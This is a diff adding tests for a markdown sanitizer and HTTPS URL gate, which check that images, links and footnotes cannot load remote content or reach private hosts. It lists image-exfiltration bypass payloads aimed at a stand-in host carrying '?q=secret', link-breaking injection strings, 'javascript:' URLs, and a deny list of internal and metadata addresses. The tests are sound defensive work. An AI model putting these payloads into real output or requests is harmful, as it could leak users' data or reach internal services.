@@ -585,3 +585,130 @@ test('skeleton instruction: conservative, forbids numbers, dates, proper nouns, 
   for (const word of ['numbers', 'dates', 'prices', 'proper nouns', 'quotations', 'architecture', 'concepts']) assert.ok(en.includes(word), word);
   assert.equal(skeletonInstruction('zh-TW'), skeletonInstruction('zh-CN'));
 });
+
+// ---------- R1 F1: allowlist builder, URL gate, private hosts ----------
+const { normalizeHttpsUrl } = apply;
+const hasImageNode = text => /(^|[^\\])!\[/.test(text) || /<img/i.test(text);
+const BYPASSES = [
+  ['R1-B1 nested brackets in alt text', '![a [b] c](https://evil.example/x.png?q=secret)'],
+  ['R1-B1 reference-style image with a definition', '![x]\n\n[x]: https://evil.example/i.png'],
+  ['R1-B1 collapsed reference image', '![x][]\n\n[x]: https://evil.example/i.png'],
+  ['R1-B1 full reference image', '![x][r]\n\n[r]: https://evil.example/i.png'],
+  ['R1-B1 angle-bracket destination', '![a](<https://evil.example/x y.png>)'],
+  ['R1-B1 image inside a link', '[![x](https://evil.example/i.png)](https://ok.example)'],
+  ['R1-B1 title containing a paren', '![x](https://evil.example/i.png "t)")'],
+  ['R1-B1 raw img split over lines', '<img\nsrc="https://evil.example/i.png">'],
+  ['R1-B1 parenthesized url', '![x](https://evil.example/a(b).png)']
+];
+
+test('R1-B1 allowlist builder: no image node or remote load survives any bypass form', () => {
+  for (const [name, input] of BYPASSES) {
+    const out = clean(input);
+    assert.ok(!hasImageNode(out), `${name}: ${JSON.stringify(out)}`);
+    assert.ok(!/evil\.example/.test(out.replace(/\[[^\]]*\]:\s*\S+/g, '')) || !/!\[/.test(out), name);
+  }
+});
+
+test('R1-B1 allowlist builder: wiki links, reference links and unknown footnote references become escaped text', () => {
+  assert.equal(clean('[[Secret note]]'), '\\[\\[Secret note\\]\\]');
+  assert.equal(clean('[x][r]'), '\\[x\\]\\[r\\]');
+  const out = sanitizePhase2Markdown('見[^1]和[^9]', { footnoteIds: new Set(['1']) }).markdown;
+  assert.equal(out, '見[^1]和\\[^9\\]');
+});
+
+test('R1-B1 allowlist builder: own embeds pass only when listed; the output is stable when built twice', () => {
+  const options = { embeds: new Set(['Att/a.png']) };
+  assert.equal(sanitizePhase2Markdown('![[Att/a.png]]\n![[Att/b.png]]', options).markdown, '![[Att/a.png]]');
+  for (const [, input] of BYPASSES.concat([['mix', '## 標題\n\n- 內容[^1] [來源](https://example.com/a?b=c) [[w]] <b>x</b>\n\n[^1]: [S](https://example.com)']])) {
+    const once = sanitizePhase2Markdown(input, options).markdown;
+    assert.equal(sanitizePhase2Markdown(once, options).markdown, once, input);
+  }
+});
+
+test('R1-B1 footnote titles: <img>, markdown images and nested brackets never reach the definition', () => {
+  const out = renderFootnoteDefinitions([
+    { id: '1', url: 'https://ok.example/', title: '<img src="https://evil.example/p.png?q=secret">' },
+    { id: '2', url: 'https://ok.example/', title: '![x](https://evil.example/i.png)' },
+    { id: '3', url: 'https://ok.example/', title: '[<img src="https://evil.example/p.png">](https://ok.example/)' },
+    { id: '4', url: 'https://ok.example/', title: 'a\\' }
+  ]);
+  assert.doesNotMatch(out, /evil\.example|<img|!\[/);
+  assert.equal(out.split('\n').length, 4);
+  for (const line of out.split('\n')) assert.match(line, /^\[\^\d\]: \[[^\][\\]*\]\(https:\/\/ok\.example\/\)$/);
+});
+
+test('R1-B1 corrections: correction text and old-sentence footnotes go through the builder', () => {
+  const result = applyCorrections('外套很保暖。', [{ sentence: '外套很保暖。', verdict: 'unsupported', correction: '<img src="https://evil.example/p.png?q=secret"> ![x](https://evil.example/i.png) 其實普通。', sourceUrl: 'https://ok.example/a' }]);
+  assert.doesNotMatch(result.detail, /evil\.example|<img|!\[/);
+  assert.match(result.detail, /其實普通。/);
+  assert.deepEqual(plain(result.addedFootnoteIds), ['1']);
+  const gone = applyCorrections('外套很保暖。', [{ sentence: '外套很保暖。', verdict: 'unsupported', correction: '<img src="https://evil.example/p.png">' }]);
+  assert.equal(gone.removed.length, 1, 'a correction with nothing left removes the sentence');
+});
+
+test('R1-M1 URL gate: Wikimedia address with parentheses is accepted and written with %28 %29', () => {
+  const wiki = 'https://upload.wikimedia.org/wikipedia/commons/a/ab/Coat_(October_08,_2017).jpg';
+  assert.equal(normalizeHttpsUrl(wiki), 'https://upload.wikimedia.org/wikipedia/commons/a/ab/Coat_%28October_08,_2017%29.jpg');
+  assert.ok(apply.isHttpsUrl(wiki));
+  assert.equal(clean(`[圖](${wiki})`), '[圖](https://upload.wikimedia.org/wikipedia/commons/a/ab/Coat_%28October_08,_2017%29.jpg)');
+  const out = renderFootnoteDefinitions([{ id: '1', url: wiki, title: 'File' }]);
+  assert.match(out, /Coat_%28October_08,_2017%29\.jpg\)$/);
+});
+
+test('R1-M1 URL gate: an escape string cannot close the link or open an image', () => {
+  const evil = 'https://x.example/a)![i](https://evil.example/p.png';
+  const href = normalizeHttpsUrl(evil);
+  assert.ok(href && !/[()[\]!]/.test(href.slice(8)), href);
+  const out = renderFootnoteDefinitions([{ id: '1', url: evil, title: 'T' }]);
+  assert.ok(!hasImageNode(out) && !/!\[/.test(out), out);
+  assert.equal((out.match(/\]\(/g) || []).length, 1);
+  assert.ok(!/!\[/.test(clean(`[a](<${evil}>)`)));
+});
+
+test('R1-M1 URL gate: javascript, http, data, credentials, private hosts and unsafe characters stay rejected', () => {
+  for (const bad of [
+    'javascript:alert(1)', 'http://example.com/a', 'data:text/html;base64,AAA', 'https://user:pw@example.com/a', 'https://user@example.com/a', 'https://@example.com/a',
+    'https://localhost/a', 'https://192.168.1.5/a', 'https://example.com/a b', 'https://example.com/a\tb', 'https://example.com/a\u0000b', 'https://example.com/a<b',
+    'https://example.com/a"b', "https://example.com/a'b", 'https://example.com/a`b', 'https://example.com/a\\b', `https://example.com/a${String.fromCharCode(0x200b)}b`, 'https://', 'https:///a', ''
+  ])
+    assert.equal(normalizeHttpsUrl(bad), undefined, JSON.stringify(bad));
+});
+
+test('R1-M1 parse: one bad footnote, source address or image is dropped, the rest of phase 2 stays', () => {
+  const result = plain(parseOf(validReply({
+    footnotes: [
+      { id: '1', url: 'https://example.org/a', title: 'A' },
+      { id: '2', url: 'https://example.org/a b', title: 'space' },
+      { id: '3', url: 'https://127.0.0.1/a', title: 'private' },
+      { id: '4', url: 'https://commons.example/File_(x).jpg', title: 'paren' }
+    ],
+    verdicts: [{ sentence: 'x', verdict: 'unsupported', correction: 'y', sourceUrl: 'https://user:pw@example.org/' }],
+    images: [
+      { imageUrl: 'https://x.org/a.png', sourceUrl: 'https://x.org/p', title: 'ok', license: 'CC0' },
+      { imageUrl: 'https://x.org/b c.png', sourceUrl: 'https://x.org/p', title: 'bad', license: 'CC0' },
+      { imageUrl: 'https://upload.example/File_(1).jpg', sourceUrl: 'https://x.org/p', title: 'paren', license: 'CC0' }
+    ]
+  })));
+  assert.deepEqual(result.footnotes.map(note => note.id), ['1', '4']);
+  assert.equal(result.footnotes[1].url, 'https://commons.example/File_%28x%29.jpg');
+  assert.deepEqual(result.verdicts[0], { sentence: 'x', verdict: 'unsupported', correction: 'y' });
+  assert.deepEqual(result.images.map(image => image.title), ['ok', 'paren']);
+  assert.equal(result.images[1].imageUrl, 'https://upload.example/File_%281%29.jpg');
+});
+
+test('R1-M1 images parse: a bad address drops that image only', () => {
+  const { images } = plain(parseResearchImages(imagesReply([oneImage(), oneImage({ imageUrl: 'https://x.org/a b.png' }), oneImage({ sourceUrl: 'https://10.0.0.1/p' })])));
+  assert.equal(images.length, 1);
+});
+
+test('R1-M2 private hosts: IPv4-mapped and compatible IPv6, CGNAT, and other forms are rejected; public hosts pass', () => {
+  for (const host of [
+    '[::ffff:127.0.0.1]', '[::ffff:7f00:1]', '[::127.0.0.1]', '[::7f00:1]', '[::ffff:10.0.0.1]', '[::ffff:a9fe:a9fe]', '[::1]', '[::]', '[fd00::1]', '[fe80::1]',
+    '100.64.0.1', '100.127.255.254', '0x7f000001', '2130706433', '127.1', '169.254.169.254', '172.16.0.1', '10.1.2.3', 'localhost.', 'printer.local', 'a.internal', '[64:ff9b::7f00:1]', '[2002:7f00:1::]'
+  ])
+    assert.equal(normalizeHttpsUrl(`https://${host}/a.png`), undefined, host);
+  for (const host of ['100.63.255.255', '100.128.0.1', '8.8.8.8', '[2606:4700:4700::1111]', 'upload.wikimedia.org'])
+    assert.ok(normalizeHttpsUrl(`https://${host}/a.png`), host);
+  const bad = ['https://[::ffff:127.0.0.1]/a.png', 'https://100.64.0.1/a.png'].map(imageUrl => img({ imageUrl }));
+  assert.equal(eligibleImages(bad).eligible.length, 0);
+});
